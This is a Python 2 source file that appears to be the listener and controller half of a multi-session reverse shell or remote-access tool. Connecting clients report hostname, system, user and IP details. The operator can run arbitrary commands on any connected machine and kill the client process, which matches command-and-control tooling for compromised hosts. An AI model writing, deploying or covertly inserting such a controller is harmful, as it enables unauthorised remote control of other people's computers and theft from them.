#!/usr/bin/env python
# -*- coding:utf-8 -*-

#!/usr/bin/env python
# -*- coding:utf-8 -*-

import sys
import random
import socket
import threading

def show_help():
    help_message = """
[*] Show the help info
    help(): show this help info
    exit(): exit the terminal of the server
    set port PORT: set the listen port
    start: start to listen
    sessions: show the established sessions
    entersession SESSIONID: enter the specified session
    killsession SESSIONID: kill the process of the specified SESSIONID client
    """
    print help_message

def show_session_help():
    help_message = """
[*] Show the session help info
    help(): show this help info
    exit(): exit the session
    killsession(): kill the process of the client
    info(): show the info of the selected session
    set timeout TIMEOUT: set the timeout of a command
    """
    print help_message

def random_sessionid():
    return ''.join([random.choice('ABCDEFGH1234567890') for i in range(6)])

def recv_result(conn):
    result = conn.recv(1024)
    total_size = long(result[:16])
    result = result[16:]
    while total_size > len(result):
        data = conn.recv(1024)
        result += data
    return result

def accept_socket(conn):
    host_info = recv_result(conn)
    hostname, system, arch, user, ips, remark, timeout, port = host_info.split('---')
    for _ in SOCK_LIST:
        if hostname == _['hostname'] and ips == _['ips'] and remark == _["remark"] and port == _['port']:
            conn.close()
            return
    sessionid = random_sessionid()
    print "[+] Session established from: %s, Press 'Enter' to continue"%(sessionid)
    conn_dict = {
                    'sessionid' : sessionid,
                    'hostname' : hostname,
                    'system' : system,
                    'arch' : arch,
                    'user' : user,
                    'ips' : ips,
                    'remark' : remark,
                    'timeout' : timeout,
                    'port' : port,
                    'conn' : conn,
                }
    SOCK_LIST.append(conn_dict)

def show_host_info(session):
    host_info = """
[*] The host info of Session %s
    Hostname: %s
    Remark: %s
    System: %s
    Arch: %s
    User: %s
    IP: %s
    CommandTimeout: %s
    ConnectionPort: %s
    """%(session['sessionid'], session['hostname'], session['remark'],\
     session['system'], session['arch'], session['user'], session['ips'], session['timeout'], session['port'])
    print host_info

def start_listen(port):
    try:
        host = '0.0.0.0'
        s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        s.bind((host, port))
        s.listen(100)
        while 1:
            conn, addr = s.accept()
            accept_socket(conn)

    except socket.error:
        print '[-] Listen failed, please use a free port'

def kill_session(sessionid, conn):
    conn.send("killsession()")
    print "[*] kill the process of the client %s"%(sessionid)
    for _ in SOCK_LIST:
        if sessionid.lower() == _['sessionid'].lower():
            SOCK_LIST.remove(_)

def enter_session(session):
    sessionid = session['sessionid']
    conn = session['conn']
    remark = str(session['remark'])
    while 1:
        try:
            command = raw_input("$ %s@%s> "%(remark, sessionid))
            if command == "":
                continue
            elif command == "exit()":
                print "[*] exit the session %s"%(sessionid)
                break
            elif command == "killsession()":
                kill_session(sessionid, conn)
                break
            elif command == "help()":
                show_session_help()
            elif command == "info()":
                conn.send(command)
                try:
                    session['timeout'] = recv_result(conn).split('---')[6]
                except:
                    pass
                show_host_info(session)
            else:
                conn.send(command)
                print recv_result(conn)
        except:
            pass

if __name__=="__main__":
    SOCK_LIST = []
    while 1:
        command = raw_input("#> ")
        if command == 'help()':
            show_help()
        elif command == "exit()":
            print "[*] User exit"
            break
        elif command.startswith('set port'):
            try:
                port = int(command.split()[2])
            except Exception as e:
                print '[-] set port PORT, PORT should be an integer number range 1-65535'
        elif command == "start":
            try:
                t = threading.Thread(target=start_listen, args=(port,))
                t.setDaemon(True)
                t.start()
            except NameError:
                print '[-] Please set the PORT first'
        elif command == 'sessions':
            print "%-15s%-30s%-10s%-50s%-20s"%('SessionID', 'Hostname', 'User', 'IP', 'Remark')
            for _ in SOCK_LIST:
                print "%-15s%-30s%-10s%-50s%-20s"%(_['sessionid'], _['hostname'], _['user'], _['ips'], _['remark'])
        elif command.startswith('entersession'):
            try:
                sessionid = command.split()[1]
                session_flag = 0
                for _ in SOCK_LIST:
                    if sessionid.lower() == _['sessionid'].lower():
                        print "[*] Enter the session %s"%(sessionid)
                        enter_session(_)
                        session_flag = 1
                if session_flag == 0:
                    print "[-] No such session"
                if len(SOCK_LIST) == 0:
                    print "[-] No established session"
            except:
                print "[-] session SESSIONID, type 'sessions' to show the established sessions and the SESSIONID"
        elif command.startswith('killsession'):
            try:
                sessionid = command.split()[1]
                session_flag = 0
                for _ in SOCK_LIST:
                    if sessionid.lower() == _['sessionid'].lower():
                        kill_session(sessionid, _['conn'])
                        session_flag = 1
                if session_flag == 0:
                    print "[-] No such session"
            except Exception as e:
                print e
                print "[-] killsession SESSIONID, type 'sessions' to show the established sessions and the SESSIONID"
        else:
            print "[-] type 'help()' to show the help info"